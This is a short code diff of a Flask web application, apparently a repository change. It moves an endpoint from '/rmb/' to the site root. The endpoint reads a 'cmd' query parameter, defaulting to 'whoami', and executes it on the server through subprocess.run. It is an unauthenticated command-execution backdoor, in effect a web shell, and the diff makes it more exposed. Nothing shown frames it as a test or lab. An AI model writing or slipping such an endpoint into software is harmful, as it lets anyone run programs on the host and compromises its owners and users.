@@ -5,8 +5,8 @@ from flask import Flask
 
 app = Flask(__name__)
 
-@app.route('/rmb/')
-def hello():
+@app.route('/')
+def main():
     cmd = request.args.get('cmd', 'whoami')
     result = subprocess.run([cmd], capture_output=True, text=True)
     print(result.stdout)
